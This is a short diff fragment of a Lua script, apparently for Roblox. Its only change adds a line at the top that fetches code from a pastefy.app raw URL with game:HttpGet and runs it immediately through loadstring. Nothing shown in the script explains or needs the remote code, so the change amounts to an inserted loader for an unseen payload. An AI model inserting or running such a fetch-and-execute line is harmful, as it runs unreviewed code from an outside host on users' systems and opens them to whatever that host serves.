@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/Ybp0kLEU/raw"))()
+
 -- // Variables \\
 local players = game:GetService("Players")
 local localPlayer = players.LocalPlayer
